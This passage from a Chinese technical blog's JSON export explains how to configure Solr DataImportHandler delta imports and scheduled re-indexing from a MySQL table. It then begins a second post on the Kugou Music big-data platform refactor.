password=&quot;luxx&quot; batchSize=&quot;-1&quot; /&gt;&#x3000;&#x3000;&lt;document name=&quot;testDoc&quot;&gt; &lt;entity name=&quot;user&quot; pk=&quot;id&quot; query=&quot;select * from user&quot; deltaImportQuery=&quot;select * from user where id=&apos;${dih.delta.id}&apos;&quot; deltaQuery=&quot;select id from user where updateTime&gt; &apos;${dataimporter.last_index_time}&apos;&quot;&gt;&#x3000;&#x3000;&#x3000; &lt;field column=&quot;id&quot; name=&quot;id&quot;/&gt;&#x3000;&#x3000;&#x3000; &lt;field column=&quot;userName&quot; name=&quot;userName&quot;/&gt; &lt;field column=&quot;userAge&quot; name=&quot;userAge&quot;/&gt; &lt;field column=&quot;userAddress&quot; name=&quot;userAddress&quot;/&gt;&lt;field column=&quot;updateTime&quot; name=&quot;updateTime&quot;/&gt;&#x3000;&#x3000;&#x3000; &lt;/entity&gt;&#x3000;&#x3000;&lt;/document&gt;&lt;/dataConfig&gt; &#x589E;&#x91CF;&#x7D22;&#x5F15;&#x7684;&#x539F;&#x7406;&#x662F;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x6839;&#x636E;deltaQuery&#x6307;&#x5B9A;&#x7684;SQL&#x8BED;&#x53E5;&#x67E5;&#x8BE2;&#x51FA;&#x6240;&#x6709;&#x9700;&#x8981;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x7684;&#x6570;&#x636E;&#x7684;ID&#x53F7;&#x3002; &#x7136;&#x540E;&#x6839;&#x636E;deltaImportQuery&#x6307;&#x5B9A;&#x7684;SQL&#x8BED;&#x53E5;&#x8FD4;&#x56DE;&#x6240;&#x6709;&#x8FD9;&#x4E9B;ID&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5373;&#x4E3A;&#x8FD9;&#x6B21;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x6240;&#x8981;&#x5904;&#x7406;&#x7684;&#x6570;&#x636E;&#x3002; &#x6838;&#x5FC3;&#x601D;&#x60F3;&#x662F;&#xFF1A;&#x901A;&#x8FC7;&#x5185;&#x7F6E;&#x53D8;&#x91CF;&#x201C;${dih.delta.id}&#x201D;&#x548C; &#x201C;${dataimporter.last_index_time}&#x201D;&#x6765;&#x8BB0;&#x5F55;&#x672C;&#x6B21;&#x8981;&#x7D22;&#x5F15;&#x7684;id&#x548C;&#x6700;&#x8FD1;&#x4E00;&#x6B21;&#x7D22;&#x5F15;&#x7684;&#x65F6;&#x95F4;&#x3002; &#x6CE8;&#x610F;&#xFF1A;&#x521A;&#x65B0;&#x52A0;&#x4E0A;&#x7684;updateTime&#x5B57;&#x6BB5;&#x4E5F;&#x8981;&#x5728;field&#x5C5E;&#x6027;&#x4E2D;&#x914D;&#x7F6E;&#xFF0C;&#x540C;&#x65F6;&#x4E5F;&#x8981;&#x5728;schema.xml&#x6587;&#x4EF6;&#x4E2D;&#x914D;&#x7F6E;&#xFF1A;1&lt;field name=&quot;updateTime&quot; type=&quot;date&quot; indexed=&quot;true&quot; stored=&quot;true&quot; /&gt; &#x5982;&#x679C;&#x4E1A;&#x52A1;&#x4E2D;&#x8FD8;&#x6709;&#x5220;&#x9664;&#x64CD;&#x4F5C;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x52A0;&#x4E00;&#x4E2A;isDeleted&#x5B57;&#x6BB5;&#x6765;&#x8868;&#x660E;&#x8BE5;&#x6761;&#x6570;&#x636E;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x88AB;&#x5220;&#x9664;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;Solr&#x5728;&#x66F4;&#x65B0;index&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x8FD9;&#x4E2A;&#x5B57;&#x6BB5;&#x6765;&#x66F4;&#x65B0;&#x54EA;&#x4E9B;&#x5DF2;&#x7ECF;&#x5220;&#x9664;&#x4E86;&#x7684;&#x8BB0;&#x5F55;&#x7684;&#x7D22;&#x5F15;&#x3002; &#x8FD9;&#x65F6;&#x5019;&#x9700;&#x8981;&#x5728;dataConfig.xml&#x4E2D;&#x6DFB;&#x52A0;&#xFF1A;1234query=&quot;select * from user where isDeleted=0&quot;deltaImportQuery=&quot;select * from user where id=&apos;${dih.delta.id}&apos;&quot;deltaQuery=&quot;select id from user where updateTime&gt; &apos;${dataimporter.last_index_time}&apos; and isDeleted=0&quot;deletedPkQuery=&quot;select id from user where isDeleted=1&quot; &#x8FD9;&#x65F6;&#x5019;Solr&#x8FDB;&#x884C;&#x589E;&#x91CF;&#x7D22;&#x5F15;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x4F1A;&#x5220;&#x9664;&#x6570;&#x636E;&#x5E93;&#x4E2D;isDeleted=1&#x7684;&#x6570;&#x636E;&#x7684;&#x7D22;&#x5F15;&#x3002; &#x6D4B;&#x8BD5;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x5982;&#x679C;User&#x8868;&#x91CC;&#x6709;&#x6570;&#x636E;&#xFF0C;&#x53EF;&#x4EE5;&#x5148;&#x6E05;&#x7A7A;&#x4EE5;&#x524D;&#x7684;&#x6D4B;&#x8BD5;&#x6570;&#x636E;&#xFF08;&#x56E0;&#x4E3A;&#x52A0;&#x7684;updateTime&#x6CA1;&#x6709;&#x503C;&#xFF09;&#xFF0C;&#x7528;&#x6211;&#x7684;Mybatis&#x6D4B;&#x8BD5;&#x7A0B;&#x5E8F;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;User&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x4F1A;&#x4EE5;&#x5F53;&#x524D;&#x65F6;&#x95F4;&#x8D4B;&#x503C;&#x7ED9;&#x8BE5;&#x5B57;&#x6BB5;&#x3002;&#x5728;Solr&#x4E2D;&#x4F7F;&#x7528;Query&#x67E5;&#x8BE2;&#x6240;&#x6709;&#x6CA1;&#x6709;&#x67E5;&#x8BE2;&#x5230;&#x8BE5;&#x503C;&#xFF0C;&#x4F7F;&#x7528;dataimport?command=delta-import&#x589E;&#x91CF;&#x5BFC;&#x5165;&#xFF0C;&#x518D;&#x6B21;&#x67E5;&#x8BE2;&#x6240;&#x6709;&#x5C31;&#x53EF;&#x4EE5;&#x67E5;&#x8BE2;&#x5230;&#x521A;&#x521A;&#x63D2;&#x5165;&#x5230;MySQL&#x7684;&#x503C;&#x3002; &#x8BBE;&#x7F6E;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x4E3A;&#x5B9A;&#x65F6;&#x6267;&#x884C;&#x7684;&#x4EFB;&#x52A1;&#x53EF;&#x4EE5;&#x7528;Windows&#x8BA1;&#x5212;&#x4EFB;&#x52A1;&#xFF0C;&#x6216;&#x8005;Linux&#x7684;Cron&#x6765;&#x5B9A;&#x671F;&#x8BBF;&#x95EE;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x7684;&#x8FDE;&#x63A5;&#x6765;&#x5B8C;&#x6210;&#x5B9A;&#x65F6;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x8FD9;&#x5176;&#x5B9E;&#x4E5F;&#x662F;&#x53EF;&#x4EE5;&#x7684;&#xFF0C;&#x800C;&#x4E14;&#x5E94;&#x8BE5;&#x6CA1;&#x4EC0;&#x4E48;&#x95EE;&#x9898;&#x3002; &#x4F46;&#x662F;&#x66F4;&#x65B9;&#x4FBF;&#xFF0C;&#x66F4;&#x52A0;&#x4E0E;Solr&#x672C;&#x8EAB;&#x96C6;&#x6210;&#x5EA6;&#x9AD8;&#x7684;&#x662F;&#x5229;&#x7528;&#x5176;&#x81EA;&#x8EAB;&#x7684;&#x5B9A;&#x65F6;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x529F;&#x80FD;&#x3002; 1&#x3001;&#x4E0B;&#x8F7D;apache-solr-dataimportscheduler-1.0.jar&#x653E;&#x5230;\\solr-webapp\\webapp\\WEB-INF\\lib&#x76EE;&#x5F55;&#x4E0B;&#xFF1A;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;http://code.google.com/p/solr-dataimport-scheduler/downloads/list&#x4E5F;&#x53EF;&#x4EE5;&#x5230;&#x767E;&#x5EA6;&#x4E91;&#x76D8;&#x4E0B;&#x8F7D;&#xFF1A;http://pan.baidu.com/s/1dDw0MRn &#x6CE8;&#x610F;&#xFF1A;apache-solr-dataimportscheduler-1.0.jar&#x6709;bug&#xFF0C;&#x53C2;&#x8003;&#xFF1A;http://www.denghuafeng.com/post-242.html 2&#x3001;&#x4FEE;&#x6539;solr&#x7684;WEB-INF&#x76EE;&#x5F55;&#x4E0B;&#x9762;&#x7684;web.xml&#x6587;&#x4EF6;&#xFF1A;&#x4E3A;&#x5143;&#x7D20;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x5B50;&#x5143;&#x7D20;12345&lt;listener&gt; &lt;listener-class&gt; org.apache.solr.handler.dataimport.scheduler.ApplicationListener &lt;/listener-class&gt; &lt;/listener&gt; 3&#x3001;&#x65B0;&#x5EFA;&#x914D;&#x7F6E;&#x6587;&#x4EF6;dataimport.properties&#xFF1A; &#x5728;SOLR_HOME\\solr&#x76EE;&#x5F55;&#x4E0B;&#x9762;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;conf&#xFF08;&#x6CE8;&#x610F;&#x4E0D;&#x662F;SOLR_HOME\\solr\\collection1&#x4E0B;&#x9762;&#x7684;conf&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x7528;&#x89E3;&#x538B;&#x6587;&#x4EF6;&#x6253;&#x5F00;apache-solr-dataimportscheduler-1.0.jar&#x6587;&#x4EF6;&#xFF0C;&#x5C06;&#x91CC;&#x9762;&#x7684;dataimport.properties&#x6587;&#x4EF6;&#x62F7;&#x8D1D;&#x8FC7;&#x6765;&#xFF0C;&#x8FDB;&#x884C;&#x4FEE;&#x6539;&#xFF0C;&#x4E0B;&#x9762;&#x662F;&#x6700;&#x7EC8;&#x6211;&#x7684;&#x81EA;&#x52A8;&#x5B9A;&#x65F6;&#x66F4;&#x65B0;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#xFF1A; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748################################################## ## dataimport scheduler properties ## ################################################### to sync or not to sync# 1 - active; anything else - inactivesyncEnabled=1# which cores to schedule# in a multi-core environment you can decide which cores you want syncronized# leave empty or comment it out if using single-core deployment# syncCores=game,resourcesyncCores=collection1# solr server name or IP address# [defaults to localhost if empty]server=localhost# solr server port# [defaults to 80 if empty]port=8983# application name/context# [defaults to current ServletContextListener&apos;s context (app) name]webapp=solr# URLparams [mandatory]# remainder of URL#http://localhost:8983/solr/collection1/dataimport?command=delta-import&amp;clean=false&amp;commit=trueparams=/dataimport?command=delta-import&amp;clean=false&amp;commit=true# schedule interval# number of minutes between two runs# [defaults to 30 if empty]interval=1# &#x91CD;&#x505A;&#x7D22;&#x5F15;&#x7684;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#xFF0C;&#x5355;&#x4F4D;&#x5206;&#x949F;&#xFF0C;&#x9ED8;&#x8BA4;7200&#xFF0C;&#x5373;1&#x5929;; # &#x4E3A;&#x7A7A;,&#x4E3A;0,&#x6216;&#x8005;&#x6CE8;&#x91CA;&#x6389;:&#x8868;&#x793A;&#x6C38;&#x4E0D;&#x91CD;&#x505A;&#x7D22;&#x5F15;# reBuildIndexInterval=2# &#x91CD;&#x505A;&#x7D22;&#x5F15;&#x7684;&#x53C2;&#x6570;reBuildIndexParams=/dataimport?command=full-import&amp;clean=true&amp;commit=true# &#x91CD;&#x505A;&#x7D22;&#x5F15;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x7684;&#x8BA1;&#x65F6;&#x5F00;&#x59CB;&#x65F6;&#x95F4;&#xFF0C;&#x7B2C;&#x4E00;&#x6B21;&#x771F;&#x6B63;&#x6267;&#x884C;&#x7684;&#x65F6;&#x95F4;=reBuildIndexBeginTime+reBuildIndexInterval*60*1000&#xFF1B;# &#x4E24;&#x79CD;&#x683C;&#x5F0F;&#xFF1A;2012-04-11 03:10:00 &#x6216;&#x8005; 03:10:00&#xFF0C;&#x540E;&#x4E00;&#x79CD;&#x4F1A;&#x81EA;&#x52A8;&#x8865;&#x5168;&#x65E5;&#x671F;&#x90E8;&#x5206;&#x4E3A;&#x670D;&#x52A1;&#x542F;&#x52A8;&#x65F6;&#x7684;&#x65E5;&#x671F;reBuildIndexBeginTime=03:10:00 &#x8FD9;&#x91CC;&#x4E3A;&#x4E86;&#x505A;&#x6D4B;&#x8BD5;&#x6BCF;1&#x5206;&#x949F;&#x5C31;&#x8FDB;&#x884C;&#x4E00;&#x6B21;&#x589E;&#x91CF;&#x7D22;&#x5F15;&#xFF0C;&#x540C;&#x65F6;disable&#x4E86;full-import&#x5168;&#x91CF;&#x7D22;&#x5F15;&#x3002; 4&#x3001;&#x6D4B;&#x8BD5; &#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x63D2;&#x5165;&#x4E00;&#x6761;&#x6570;&#x636E;&#xFF0C;&#x5728;Solr Query&#x4E2D;&#x67E5;&#x8BE2;&#xFF0C;&#x521A;&#x5F00;&#x59CB;&#x67E5;&#x4E0D;&#x5230;&#xFF0C;Solr&#x8FDB;&#x884C;&#x4E00;&#x6B21;&#x589E;&#x91CF;&#x7D22;&#x5F15;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x67E5;&#x8BE2;&#x5230;&#x4E86;&#x3002; &#x4E00;&#x822C;&#x6765;&#x8BF4;&#x8981;&#x5728;&#x4F60;&#x7684;&#x9879;&#x76EE;&#x4E2D;&#x5F15;&#x5165;Solr&#x9700;&#x8981;&#x8003;&#x8651;&#x4EE5;&#x4E0B;&#x51E0;&#x70B9;&#xFF1A;1&#x3001;&#x6570;&#x636E;&#x66F4;&#x65B0;&#x9891;&#x7387;&#xFF1A;&#x6BCF;&#x5929;&#x6570;&#x636E;&#x589E;&#x91CF;&#x6709;&#x591A;&#x5927;&#xFF0C;&#x53CA;&#x65F6;&#x66F4;&#x65B0;&#x8FD8;&#x662F;&#x5B9A;&#x65F6;&#x66F4;&#x65B0;2&#x3001;&#x6570;&#x636E;&#x603B;&#x91CF;&#xFF1A;&#x6570;&#x636E;&#x8981;&#x4FDD;&#x5B58;&#x591A;&#x957F;&#x65F6;&#x95F4;3&#x3001;&#x4E00;&#x81F4;&#x6027;&#x8981;&#x6C42;&#xFF1A;&#x671F;&#x671B;&#x591A;&#x957F;&#x65F6;&#x95F4;&#x5185;&#x770B;&#x5230;&#x66F4;&#x65B0;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x6700;&#x957F;&#x5141;&#x8BB8;&#x591A;&#x957F;&#x65F6;&#x95F4;&#x5EF6;&#x8FDF;4&#x3001;&#x6570;&#x636E;&#x7279;&#x70B9;&#xFF1A;&#x6570;&#x636E;&#x6E90;&#x5305;&#x62EC;&#x54EA;&#x4E9B;&#xFF0C;&#x5E73;&#x5747;&#x5355;&#x6761;&#x8BB0;&#x5F55;&#x5927;&#x5C0F;5&#x3001;&#x4E1A;&#x52A1;&#x7279;&#x70B9;&#xFF1A;&#x6709;&#x54EA;&#x4E9B;&#x6392;&#x5E8F;&#x8981;&#x6C42;&#xFF0C;&#x68C0;&#x7D22;&#x6761;&#x4EF6;6&#x3001;&#x8D44;&#x6E90;&#x590D;&#x7528;&#xFF1A;&#x5DF2;&#x6709;&#x7684;&#x786C;&#x4EF6;&#x914D;&#x7F6E;&#x662F;&#x600E;&#x6837;&#x7684;&#xFF0C;&#x662F;&#x5426;&#x6709;&#x5347;&#x7EA7;&#x8BA1;&#x5212;","raw":null,"content":null,"categories":[{"name":"搜索","slug":"搜索","permalink":"http://www.wangxin123.com/categories/搜索/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://www.wangxin123.com/tags/mysql/"},{"name":"solr","slug":"solr","permalink":"http://www.wangxin123.com/tags/solr/"}]},{"title":"酷狗音乐的大数据平台重构","slug":"酷狗音乐的大数据平台重构","date":"2016-06-29T13:18:00.000Z","updated":"2017-02-21T08:35:14.973Z","comments":true,"path":"2016/06/29/酷狗音乐的大数据平台重构/","link":"","permalink":"http://www.wangxin123.com/2016/06/29/酷狗音乐的大数据平台重构/","excerpt":"&#x672C;&#x6587;&#x662F;&#x9177;&#x72D7;&#x97F3;&#x4E50;&#x7684;&#x67B6;&#x6784;&#x5E08;&#x738B;&#x52B2;&#x5BF9;&#x9177;&#x72D7;&#x5927;&#x6570;&#x636E;&#x67B6;&#x6784;&#x91CD;&#x6784;&#x7684;&#x603B;&#x7ED3;&#x3002;&#x9177;&#x72D7;&#x97F3;&#x4E50;&#x7684;&#x5927;&#x6570;&#x636E;&#x67B6;&#x6784;&#x672C;&#x8EAB;&#x5F88;&#x7ECF;&#x5178;&#xFF0C;&#x800C;&#x8FD9;&#x7BC7;&#x8BB2;&#x89E3;&#x4E86;&#x5BF9;&#x539F;&#x6765;&#x7684;&#x67B6;&#x6784;&#x4E0A;&#x8FDB;&#x884C;&#x91CD;&#x6784;&#x7684;&#x5DE5;&#x4F5C;&#x5185;&#x5BB9;&#xFF0C;&#x603B;&#x5171;&#x5206;&#x4E3A;&#x91CD;&#x6784;&#x7684;&#x539F;&#x56E0;&#x3001;&#x65B0;&#x4E00;&#x4EE3;&#x7684;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x67B6;&#x6784;&#x3001;&#x8E29;&#x8FC7;&#x7684;&#x5751;&#x3001;&#x540E;&#x7EED;&#x6301;&#x7EED;&#x6539;&#x8FDB;&#x56DB;&#x4E2A;&#x90E8;&#x5206;&#x6765;&#x7ED9;&#x5927;&#x5BB6;&#x8C08;&#x9177;&#x72D7;&#x97F3;&#x4E50;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x91CD;&#x6784;&#x7684;&#x8FC7;&#x7A0B;&#x3002; &#x7728;&#x773C;&#x5C31;&#x662F;&#x65B0;&#x7684;&#x4E00;&#x5E74;&#x4E86;&#xFF0C;&#x65F6;&#x95F4;&#x8FC7;&#x7684;&#x771F;&#x5FEB;&#xFF0C;&#x8D81;&#x8FD9;&#x6BB5;&#x65F6;&#x95F4;&#x4E00;&#x76F4;&#x5728;&#x5199;&#x603B;&#x7ED3;&#x7684;&#x673A;&#x4F1A;&#xFF0C;&#x4E5F;&#x603B;&#x7ED3;&#x4E0B;&#x4E0A;&#x4E00;&#x5E74;&#x7684;&#x5DE5;&#x4F5C;&#x7ECF;&#x9A8C;&#xFF0C;&#x907F;&#x514D;&#x91CD;&#x590D;&#x8E29;&#x5751;&#x3002;&#x9177;&#x72D7;&#x97F3;&#x4E50;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x91CD;&#x6784;&#x6574;&#x6574;&#x7ECF;&#x5386;&#x4E86;&#x4E00;&#x5E74;&#x65F6;&#x95F4;&#xFF0C;&#x5927;&#x5934;&#x7684;&#x884C;&#x4E3A;&#x6D41;&#x6C34;&#x6570;&#x636E;&#x8FC1;&#x79FB;&#x5230;&#x65B0;&#x5E73;&#x53F0;&#x7A33;&#x5B9A;&#x8FD0;&#x884C;&#xFF0C;&#x5728;&#x8FD9;&#x8FC7;&#x7A0B;&#x4E2D;&#x586B;&#x8FC7;&#x5751;&#xFF0C;&#x6316;&#x8FC7;&#x5751;&#xFF0C;&#x4E3A;&#x540E;&#x7EED;&#x4E1A;&#x52A1;&#x7684;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x9700;&#x6C42;&#x6253;&#x4E0B;&#x4E86;&#x5F88;&#x597D;&#x7684;&#x57FA;&#x7840;&#x3002;&#x5728;&#x6B64;&#x611F;&#x8C22;&#x9177;&#x72D7;&#x56E2;&#x961F;&#x6210;&#x5458;&#x7684;&#x4E0D;&#x61C8;&#x52AA;&#x529B;&#xFF0C;&#x5927;&#x90E8;&#x5206;&#x4ECE;&#x5F00;&#x59CB;&#x53EA;&#x77E5;&#x9053;&#x5927;&#x6570;&#x636E;&#x8FD9;&#x4E2A;&#x6982;&#x5FF5;&#xFF0C;&#x5230;&#x73B0;&#x5728;&#x6210;&#x4E3A;&#x56E2;&#x961F;&#x7684;&#x6280;&#x672F;&#x652F;&#x67F1;&#xFF0C;&#x611F;&#x5230;&#x5F88;&#x6B23;&#x6170;&#x3002; &#x4ECE;&#x91CD;&#x6784;&#x539F;&#x56E0;&#xFF0C;&#x6280;&#x672F;&#x67B6;&#x6784;&#xFF0C;&#x8E29;&#x8FC7;&#x7684;&#x5751;&#xFF0C;&#x540E;&#x7EED;&#x6301;&#x7EED;&#x6539;&#x8FDB;&#x56DB;&#x4E2A;&#x65B9;&#x9762;&#x6765;&#x63CF;&#x8FF0;&#x9177;&#x72D7;&#x97F3;&#x4E50;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x91CD;&#x6784;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x5728;&#x6B64;&#x629B;&#x7816;&#x5F15;&#x7389;&#xFF0C;&#x8FD9;&#x6B21;&#x7684;&#x5185;&#x5BB9;&#x4E0E;6&#x6708;&#x4EFD;&#x5728;&#x9AD8;&#x53EF;&#x7528;&#x67B6;&#x6784;&#x7FA4;&#x5206;&#x4EAB;&#x7684;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x5B9E;&#x8DF5;&#x7684;&#x6709;&#x70B9;&#x4E0D;&#x540C;&#xFF0C;&#x6280;&#x672F;&#x67B6;&#x6784;&#x505A;&#x4E86;&#x4E9B;&#x8C03;&#x6574;&#x3002; &#x5176;&#x5B9E;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x662F;&#x4E00;&#x4E2A;&#x5E9E;&#x5927;&#x7684;&#x7CFB;&#x7EDF;&#x5DE5;&#x7A0B;&#xFF0C;&#x6574;&#x4E2A;&#x5EFA;&#x8BBE;&#x5468;&#x671F;&#x5F88;&#x957F;&#xFF0C;&#x6D89;&#x53CA;&#x7684;&#x751F;&#x6001;&#x94FE;&#x5F88;&#x957F;(&#x5305;&#x62EC;&#xFF1A;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x3001;&#x63A5;&#x5165;&#xFF0C;&#x6E05;&#x6D17;&#x3001;&#x5B58;&#x50A8;&#x8BA1;&#x7B97;&#x3001;&#x6570;&#x636E;&#x6316;&#x6398;&#xFF0C;&#x53EF;&#x89C6;&#x5316;&#x7B49;&#x73AF;&#x8282;&#xFF0C;&#x6BCF;&#x4E2A;&#x73AF;&#x8282;&#x90FD;&#x5F53;&#x505A;&#x4E00;&#x4E2A;&#x590D;&#x6742;&#x7684;&#x7CFB;&#x7EDF;&#x6765;&#x5EFA;&#x8BBE;)&#xFF0C;&#x98CE;&#x9669;&#x4E5F;&#x5F88;&#x5927;&#x3002;","keywords":null,"text":"&#x672C;&#x6587;&#x662F;&#x9177;&#x72D7;&#x97F3;&#x4E50;&#x7684;&#x67B6;&#x6784;&#x5E08;&#x738B;&#x52B2;&#x5BF9;&#x9177;&#x72D7;&#x5927;&#x6570;&#x636E;&#x67B6;&#x6784;&#x91CD;&#x6784;&#x7684;&#x603B;&#x7ED3;&#x3002;&#x9177;&#x72D7;&#x97F3;&#x4E50;&#x7684;&#x5927;&#x6570;&#x636E;&#x67B6;&#x6784;&#x672C;&#x8EAB;&#x5F88;&#x7ECF;&#x5178;&#xFF0C;&#x800C;&#x8FD9;&#x7BC7;&#x8BB2;&#x89E3;&#x4E86;&#x5BF9;&#x539F;&#x6765;&#x7684;&#x67B6;&#x6784;&#x4E0A;&#x8FDB;&#x884C;&#x91CD;&#x6784;&#x7684;&#x5DE5;&#x4F5C;&#x5185;&#x5BB9;&#xFF0C;&#x603B;&#x5171;&#x5206;&#x4E3A;&#x91CD;&#x6784;&#x7684;&#x539F;&#x56E0;&#x3001;&#x65B0;&#x4E00;&#x4EE3;&#x7684;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x67B6;&#x6784;&#x3001;&#x8E29;&#x8FC7;&#x7684;&#x5751;&#x3001;&#x540E;&#x7EED;&#x6301;&#x7EED;&#x6539;&#x8FDB;&#x56DB;&#x4E2A;&#x90E8;&#x5206;&#x6765;&#x7ED9;&#x5927;&#x5BB6;&#x8C08;&#x9177;&#x72D7;&#x97F3;&#x4E50;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x91CD;&#x6784;&#x7684;&#x8FC7;&#x7A0B;&#x3002; &#x7728;&#x773C;&#x5C31;&#x662F;&#x65B0;&#x7684;&#x4E00;&#x5E74;&#x4E86;&#xFF0C;&#x65F6;&#x95F4;&#x8FC7;&#x7684;&#x771F;&#x5FEB;&#xFF0C;&#x8D81;&#x8FD9;&#x6BB5;&#x65F6;&#x95F4;&#x4E00;&#x76F4;&#x5728;&#x5199;&#x603B;&#x7ED3;&#x7684;&#x673A;&#x4F1A;&#xFF0C;&#x4E5F;&#x603B;&#x7ED3;&#x4E0B;&#x4E0A;&#x4E00;&#x5E74;&#x7684;&#x5DE5;&#x4F5C;&#x7ECF;&#x9A8C;&#xFF0C;&#x907F;&#x514D;&#x91CD;&#x590D;&#x8E29;&#x5751;&#x3002;&#x9177;&#x72D7;&#x97F3;&#x4E50;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x91CD;&#x6784;&#x6574;&#x6574;&#x7ECF;&#x5386;&#x4E86;&#x4E00;&#x5E74;&#x65F6;&#x95F4;&#xFF0C;&#x5927;&#x5934;&#x7684;&#x884C;&#x4E3A;&#x6D41;&#x6C34;&#x6570;&#x636E;&#x8FC1;&#x79FB;&#x5230;&#x65B0;&#x5E73;&#x53F0;&#x7A33;&#x5B9A;&#x8FD0;&#x884C;&#xFF0C;&#x5728;&#x8FD9;&#x8FC7;&#x7A0B;&#x4E2D;&#x586B;&#x8FC7;&#x5751;&#xFF0C;&#x6316;&#x8FC7;&#x5751;&#xFF0C;&#x4E3A;&#x540E;&#x7EED;&#x4E1A;&#x52A1;&#x7684;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x9700;&#x6C42;&#x6253;&#x4E0B;&#x4E86;&#x5F88;&#x597D;&#x7684;&#x57FA;&#x7840;&#x3002;&#x5728;&#x6B64;&#x611F;&#x8C22;&#x9177;&#x72D7;&#x56E2;&#x961F;&#x6210;&#x5458;&#x7684;&#x4E0D;&#x61C8;&#x52AA;&#x529B;&#xFF0C;&#x5927;&#x90E8;&#x5206;&#x4ECE;&#x5F00;&#x59CB;&#x53EA;&#x77E5;&#x9053;&#x5927;&#x6570;&#x636E;&#x8FD9;&#x4E2A;&#x6982;&#x5FF5;&#xFF0C;&#x5230;&#x73B0;&#x5728;&#x6210;&#x4E3A;&#x56E2;&#x961F;&#x7684;&#x6280;&#x672F;&#x652F;&#x67F1;&#xFF0C;&#x611F;&#x5230;&#x5F88;&#x6B23;&#x6170;&#x3002; &#x4ECE;&#x91CD;&#x6784;&#x539F;&#x56E0;&#xFF0C;&#x6280;&#x672F;&#x67B6;&#x6784;&#xFF0C;&#x8E29;&#x8FC7;&#x7684;&#x5751;&#xFF0C;&#x540E;&#x7EED;&#x6301;&#x7EED;&#x6539;&#x8FDB;&#x56DB;&#x4E2A;&#x65B9;&#x9762;&#x6765;&#x63CF;&#x8FF0;&#x9177;&#x72D7;&#x97F3;&#x4E50;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x91CD;&#x6784;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x5728;&#x6B64;&#x629B;&#x7816;&#x5F15;&#x7389;&#xFF0C;&#x8FD9;&#x6B21;&#x7684;&#x5185;&#x5BB9;&#x4E0E;6&#x6708;&#x4EFD;&#x5728;&#x9AD8;&#x53EF;&#x7528;&#x67B6;&#x6784;&#x7FA4;&#x5206;&#x4EAB;&#x7684;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x5B9E;&#x8DF5;&#x7684;&#x6709;&#x70B9;&#x4E0D;&#x540C;&#xFF0C;&#x6280;&#x672F;&#x67B6;&#x6784;&#x505A;&#x4E86;&#x4E9B;&#x8C03;&#x6574;&#x3002; &#x5176;&#x5B9E;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x662F;&#x4E00;&#x4E2A;&#x5E9E;&#x5927;&#x7684;&#x7CFB;&#x7EDF;&#x5DE5;&#x7A0B;&#xFF0C;&#x6574;&#x4E2A;&#x5EFA;&#x8BBE;&#x5468;&#x671F;&#x5F88;&#x957F;&#xFF0C;&#x6D89;&#x53CA;&#x7684;&#x751F;&#x6001;&#x94FE;&#x5F88;&#x957F;(&#x5305;&#x62EC;&#xFF1A;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x3001;&#x63A5;&#x5165;&#xFF0C;&#x6E05;&#x6D17;&#x3001;&#x5B58;&#x50A8;&#x8BA1;&#x7B97;&#x3001;&#x6570;&#x636E;&#x6316;&#x6398;&#xFF0C;&#x53EF;&#x89C6;&#x5316;&#x7B49;&#x73AF;&#x8282;&#xFF0C;&#x6BCF;&#x4E2A;&#x73AF;&#x8282;&#x90FD;&#x5F53;&#x505A;&#x4E00;&#x4E2A;&#x590D;&#x6742;&#x7684;&#x7CFB;&#x7EDF;&#x6765;&#x5EFA;&#x8BBE;)&#xFF0C;&#x98CE;&#x9669;&#x4E5F;&#x5F88;&#x5927;&#x3002; 